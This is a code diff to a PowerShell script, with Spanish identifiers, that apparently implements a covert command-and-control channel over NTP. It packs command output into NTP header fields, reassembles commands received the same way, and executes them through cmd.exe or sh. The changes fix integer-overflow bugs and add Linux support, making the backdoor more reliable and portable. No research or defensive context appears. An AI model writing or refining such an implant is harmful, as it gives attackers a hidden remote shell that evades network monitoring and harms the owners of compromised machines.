@@ -39,18 +39,19 @@ function ConvertFrom-NtpTimestamp([uint64]$ntp) {
     return ($sec - $NTP_EPOCH_OFFSET) + ($frac / [Math]::Pow(2, 32))
 }
 
-function Write-BigEndianUInt32([byte[]]$buf, [int]$offset, [uint32]$value) {
-    $buf[$offset]   = ($value -shr 24) -band 0xFF
-    $buf[$offset+1] = ($value -shr 16) -band 0xFF
-    $buf[$offset+2] = ($value -shr 8)  -band 0xFF
-    $buf[$offset+3] = $value -band 0xFF
+function Write-BigEndianUInt32([byte[]]$buf, [int]$offset, [long]$value) {
+    $buf[$offset]   = [byte](($value -shr 24) -band 0xFF)
+    $buf[$offset+1] = [byte](($value -shr 16) -band 0xFF)
+    $buf[$offset+2] = [byte](($value -shr 8)  -band 0xFF)
+    $buf[$offset+3] = [byte]($value -band 0xFF)
 }
 
 function Read-BigEndianUInt32([byte[]]$buf, [int]$offset) {
-    return ([uint32]$buf[$offset]   -shl 24) -bor `
-           ([uint32]$buf[$offset+1] -shl 16) -bor `
-           ([uint32]$buf[$offset+2] -shl  8) -bor `
-           ([uint32]$buf[$offset+3])
+    [long]$result = (([long]$buf[$offset]   -shl 24) -bor `
+                    ([long]$buf[$offset+1] -shl 16) -bor `
+                    ([long]$buf[$offset+2] -shl  8) -bor `
+                    ([long]$buf[$offset+3])) -band 0xFFFFFFFFL
+    return [uint32]$result
 }
 
 # ─────────────────────────────────────────────
@@ -61,22 +62,23 @@ function Get-SiguienteFragmento {
         return $null
     }
 
-    $byte1 = $script:resultadoBytes[$script:offsetResultado]
+    $byte1 = [int]$script:resultadoBytes[$script:offsetResultado]
     $script:offsetResultado++
 
     if ($script:offsetResultado -lt $script:resultadoBytes.Length) {
-        $byte2 = $script:resultadoBytes[$script:offsetResultado]
+        $byte2 = [int]$script:resultadoBytes[$script:offsetResultado]
         $script:offsetResultado++
     } else {
         $byte2 = 0
     }
 
-    $mas = if ($script:offsetResultado -lt $script:resultadoBytes.Length) { 1 } else { 0 }
+    $mas     = if ($script:offsetResultado -lt $script:resultadoBytes.Length) { 1 } else { 0 }
+    $numFrag = [Math]::Max(0, [int]($script:offsetResultado / 2) - 1)
+    $datos   = ($byte1 -shl 8) -bor $byte2
 
-    $datosFrag = ([uint32]$byte1 -shl 8) -bor [uint32]$byte2
-    $numFrag   = [Math]::Max(0, ($script:offsetResultado / 2) - 1)
-
-    return ([uint32]0xFF -shl 24) -bor ([uint32]$numFrag -shl 16) -bor ([uint32]$mas -shl 15) -bor $datosFrag
+    # Construir como int64 para evitar overflow de int32, luego recortar a 32 bits
+    [long]$valor = ([long]0xFF -shl 24) -bor ([long]$numFrag -shl 16) -bor ([long]$mas -shl 15) -bor [long]$datos
+    return [uint32]($valor -band 0xFFFFFFFFL)
 }
 
 # ─────────────────────────────────────────────
@@ -91,8 +93,8 @@ function Build-Packet {
         $fragmento = Get-SiguienteFragmento
 
         if ($null -ne $fragmento) {
-            Write-BigEndianUInt32 $packet 24 0xFFFFFFFF
-            Write-BigEndianUInt32 $packet 28 ([uint32]$fragmento)
+            Write-BigEndianUInt32 $packet 24 0xFFFFFFFFL
+            Write-BigEndianUInt32 $packet 28 ([long]$fragmento)
             $numF = ($fragmento -shr 16) -band 0xFF
             $masF = ($fragmento -shr 15) -band 1
             $b1   = ($fragmento -shr 8)  -band 0xFF
@@ -107,8 +109,8 @@ function Build-Packet {
             $script:ultimoFragCmd   = -1
             Write-Host "   ✅ Respuesta enviada completamente → IDLE"
 
-            Write-BigEndianUInt32 $packet 24 0xFFFFFFFE
-            Write-BigEndianUInt32 $packet 28 0
+            Write-BigEndianUInt32 $packet 24 0xFFFFFFFEL
+            Write-BigEndianUInt32 $packet 28 0L
             $acabaDeterminar = $true
         }
     } else {
@@ -165,7 +167,12 @@ function Process-FragmentoComando([uint32]$refId) {
 # ─────────────────────────────────────────────
 function Invoke-Comando([string]$comando) {
     try {
-        $salida = & cmd.exe /c $comando 2>&1 | Out-String
+        if ([System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform(
+                [System.Runtime.InteropServices.OSPlatform]::Windows)) {
+            $salida = & cmd.exe /c $comando 2>&1 | Out-String
+        } else {
+            $salida = & sh -c $comando 2>&1 | Out-String
+        }
     } catch {
         $salida = "ERROR: $_"
     }
